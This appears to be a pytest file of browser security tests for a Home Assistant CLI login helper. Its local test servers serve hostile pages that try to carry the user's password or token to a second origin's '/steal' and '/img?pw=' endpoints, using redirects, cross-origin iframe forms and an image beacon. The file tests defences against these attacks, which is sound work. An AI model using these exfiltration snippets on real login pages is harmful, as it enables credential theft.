"""The browser-side guards, in a real headless Chromium against local HTTP servers.

Two servers on 127.0.0.1 with different ports are two origins: "ha" and "evil".
Everything stays on loopback. Needs `playwright install chromium`; without it these
tests error rather than skip, since a skipped security test reads green while
checking nothing.
"""

import json
import threading
from collections.abc import Iterator
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import pytest
from playwright.async_api import Error as PlaywrightError
from playwright.async_api import async_playwright

from ha_cli.common.frontend_auth import (
    FrontendAuth,
    FrontendAuthError,
    ensure_logged_in,
    prepare_context,
    token_init_script,
)

TOKEN = "eyJhbGciOiJIUzI1NiJ9.tok'en\"</script>\\n.sig"
PASSWORD = "pw-secret-123"
PAGE = "<html><body>ok</body></html>"


class Server:
    """A tiny HTTP server that records requests; `pages` maps path -> (status, headers, body)."""

    def __init__(self) -> None:
        self.pages: dict[str, tuple[int, dict[str, str], str]] = {}
        self.requests: list[tuple[str, str, str]] = []  # (method, path, body)
        server = self

        class Handler(BaseHTTPRequestHandler):
            def _serve(self) -> None:
                length = int(self.headers.get("Content-Length") or 0)
                body = self.rfile.read(length).decode() if length else ""
                server.requests.append((self.command, self.path, body))
                status, headers, page = server.pages.get(self.path.split("?")[0], (200, {}, PAGE))
                data = page.encode()
                self.send_response(status)
                self.send_header("Content-Type", "text/html")
                self.send_header("Content-Length", str(len(data)))
                for k, v in headers.items():
                    self.send_header(k, v)
                self.end_headers()
                self.wfile.write(data)

            do_GET = do_POST = _serve

            def log_message(self, *args) -> None:
                pass

        self.httpd = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.port = self.httpd.server_address[1]
        self.origin = f"http://127.0.0.1:{self.port}"
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()

    def bodies(self) -> str:
        return " ".join(f"{m} {p} {b}" for m, p, b in self.requests)


@pytest.fixture
def servers() -> Iterator[tuple[Server, Server]]:
    ha, evil = Server(), Server()
    yield ha, evil
    ha.httpd.shutdown()
    evil.httpd.shutdown()


async def run(auth: FrontendAuth, steps, guard: bool = True):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        try:
            context = await browser.new_context()
            if guard:
                await prepare_context(context, auth)
            else:
                await context.add_init_script(script=token_init_script(auth))
            page = await context.new_page()
            return await steps(page)
        finally:
            await browser.close()


def stored(page):
    return page.evaluate("window.localStorage.getItem('hassTokens')")


@pytest.mark.asyncio
async def test_token_round_trips_intact_on_the_ha_origin(servers):
    ha, _ = servers
    auth = FrontendAuth(url=ha.origin, token=TOKEN)

    async def steps(page):
        await page.goto(ha.origin + "/lovelace/0")
        return await stored(page)

    tokens = json.loads(await run(auth, steps))
    assert tokens["access_token"] == TOKEN
    assert tokens["hassUrl"] == ha.origin


@pytest.mark.asyncio
async def test_init_script_alone_writes_nothing_on_other_origins(servers):
    """Defence in depth: even without the navigation guard, other origins get nothing."""
    ha, evil = servers
    auth = FrontendAuth(url=ha.origin, token=TOKEN)

    async def steps(page):
        out = []
        for url in (evil.origin + "/", f"http://localhost:{ha.port}/"):  # other port; other host
            await page.goto(url)
            out.append(await stored(page))
        return out

    assert await run(auth, steps, guard=False) == [None, None]


@pytest.mark.asyncio
async def test_top_level_navigation_off_origin_is_blocked(servers):
    ha, evil = servers
    auth = FrontendAuth(url=ha.origin, token=TOKEN)

    async def steps(page):
        await page.goto(ha.origin + "/")
        with pytest.raises(PlaywrightError, match="ERR_BLOCKED_BY_CLIENT"):
            await page.goto(evil.origin + "/")

    await run(auth, steps)
    assert evil.requests == []


@pytest.mark.asyncio
async def test_page_cannot_leave_mid_login_with_the_password(servers):
    """Round-2 race: the page navigates away between the username and password fills."""
    ha, evil = servers
    ha.pages["/auth/authorize"] = (200, {}, f"""<html><body>
<input name="username"><input name="password" type="password"><ha-button>Log in</ha-button>
<script>
  document.querySelector('input[name=username]').addEventListener('input', () => {{
    window.location.href = '{evil.origin}/steal';
  }});
</script></body></html>""")
    auth = FrontendAuth(url=ha.origin, username="me", password=PASSWORD)

    async def steps(page):
        await page.goto(ha.origin + "/auth/authorize")
        with pytest.raises(FrontendAuthError, match="left Home Assistant|tried to leave") as exc:
            await ensure_logged_in(page, auth)
        return exc.value

    error = await run(auth, steps)
    assert evil.requests == []
    assert PASSWORD not in str(error)


@pytest.mark.asyncio
async def test_redirect_cannot_carry_the_password_off_origin(servers):
    """Round-3 probe: a same-origin POST answered with 307 to another origin."""
    ha, evil = servers
    ha.pages["/auth/authorize"] = (200, {}, f"""<html><body>
<form method="post" action="/login"><input name="username"><input name="password" type="password"></form>
<ha-button onclick="document.forms[0].submit()">Log in</ha-button></body></html>""")
    ha.pages["/login"] = (307, {"Location": f"{evil.origin}/steal"}, "")
    auth = FrontendAuth(url=ha.origin, username="me", password=PASSWORD)

    async def steps(page):
        await page.goto(ha.origin + "/auth/authorize")
        with pytest.raises(FrontendAuthError):
            await ensure_logged_in(page, auth)

    await run(auth, steps)
    assert ("POST", "/login", f"username=me&password={PASSWORD}") in ha.requests  # it did post to HA
    assert evil.requests == [], evil.bodies()


@pytest.mark.asyncio
async def test_same_origin_redirect_still_followed(servers):
    ha, _ = servers
    ha.pages["/auth/authorize"] = (200, {}, """<html><body>
<form method="post" action="/login"><input name="username"><input name="password" type="password"></form>
<ha-button onclick="document.forms[0].submit()">Log in</ha-button></body></html>""")
    ha.pages["/login"] = (307, {"Location": "/lovelace/0"}, "")
    auth = FrontendAuth(url=ha.origin, username="me", password=PASSWORD)

    async def steps(page):
        await page.goto(ha.origin + "/auth/authorize")
        await ensure_logged_in(page, auth)
        return page.url

    assert await run(auth, steps) == ha.origin + "/lovelace/0"


@pytest.mark.asyncio
async def test_iframes_to_other_origins_still_load(servers):
    """Camera / webpage cards embed other origins: only top-level navigation is blocked."""
    ha, evil = servers
    ha.pages["/lovelace/0"] = (200, {}, f'<html><body><iframe src="{evil.origin}/feed"></iframe></body></html>')
    auth = FrontendAuth(url=ha.origin, token=TOKEN)

    async def steps(page):
        await page.goto(ha.origin + "/lovelace/0")
        await page.wait_for_timeout(300)

    await run(auth, steps)
    assert [p for _, p, _ in evil.requests] == ["/feed"]


@pytest.mark.asyncio
async def test_failed_fill_does_not_leak_the_password_into_tracebacks(servers):
    """Round-3 probe: Playwright's timeout text quotes fill("<password>")."""
    import traceback

    ha, _ = servers
    ha.pages["/auth/authorize"] = (200, {}, """<html><body>
<input name="username"><input name="password" type="password" disabled></body></html>""")
    auth = FrontendAuth(url=ha.origin, username="me", password=PASSWORD)

    async def steps(page):
        await page.goto(ha.origin + "/auth/authorize")
        with pytest.raises(FrontendAuthError) as exc:
            await ensure_logged_in(page, auth)
        return "".join(traceback.format_exception(exc.value))

    formatted = await run(auth, steps)
    assert "FrontendAuthError" in formatted
    assert PASSWORD not in formatted


@pytest.mark.asyncio
@pytest.mark.parametrize("method", ["post", "get"])
async def test_form_aimed_at_an_off_origin_iframe_gets_nothing(servers, method):
    """Round-4 probe: a login form targeting an iframe on another origin. A GET form
    would put the password in the URL, so during login nothing may leave the origin."""
    ha, evil = servers
    ha.pages["/auth/authorize"] = (200, {}, f"""<html><body>
<iframe name="sink" src="about:blank"></iframe>
<form method="{method}" action="{evil.origin}/steal" target="sink">
  <input name="username"><input name="password" type="password"></form>
<ha-button onclick="document.forms[0].submit(); history.pushState({{}}, '', '/lovelace/0')">Log in</ha-button>
</body></html>""")
    auth = FrontendAuth(url=ha.origin, username="me", password=PASSWORD)

    async def steps(page):
        await page.goto(ha.origin + "/auth/authorize")
        try:
            await ensure_logged_in(page, auth)
        except FrontendAuthError:
            pass  # either outcome is fine; what matters is what reached the other origin
        await page.wait_for_timeout(500)

    await run(auth, steps)
    assert evil.requests == [], evil.bodies()


@pytest.mark.asyncio
async def test_off_origin_post_from_a_frame_blocked_after_login_too(servers):
    """Bodies never leave the origin, login or not; plain iframe GETs still do."""
    ha, evil = servers
    ha.pages["/lovelace/0"] = (200, {}, f"""<html><body>
<iframe name="sink" src="{evil.origin}/feed"></iframe>
<form method="post" action="{evil.origin}/steal" target="sink"><input name="x" value="data"></form>
<script>setTimeout(() => document.forms[0].submit(), 100)</script></body></html>""")
    auth = FrontendAuth(url=ha.origin, token=TOKEN)

    async def steps(page):
        await page.goto(ha.origin + "/lovelace/0")
        await page.wait_for_timeout(600)

    await run(auth, steps)
    assert [(m, p) for m, p, _ in evil.requests] == [("GET", "/feed")]


@pytest.mark.asyncio
async def test_password_mode_lets_nothing_leave_even_later(servers):
    """Once a password is in a page, a delayed GET (an image URL) could carry it: with
    password auth, no request leaves the HA origin for the life of the browser."""
    ha, evil = servers
    ha.pages["/auth/authorize"] = (200, {}, f"""<html><body>
<form method="post" action="/login"><input name="username"><input name="password" type="password"></form>
<ha-button onclick="
  const pw = document.querySelector('input[name=password]').value;
  setTimeout(() => {{ new Image().src = '{evil.origin}/img?pw=' + pw; }}, 300);
  document.forms[0].submit()">Log in</ha-button></body></html>""")
    ha.pages["/login"] = (307, {"Location": "/lovelace/0"}, "")
    ha.pages["/lovelace/0"] = (200, {}, f'<html><body><iframe src="{evil.origin}/feed"></iframe></body></html>')
    auth = FrontendAuth(url=ha.origin, username="me", password=PASSWORD)

    async def steps(page):
        await page.goto(ha.origin + "/auth/authorize")
        await ensure_logged_in(page, auth)
        await page.wait_for_timeout(800)
        return page.url

    assert await run(auth, steps) == ha.origin + "/lovelace/0"  # the login itself still works
    assert evil.requests == [], evil.bodies()
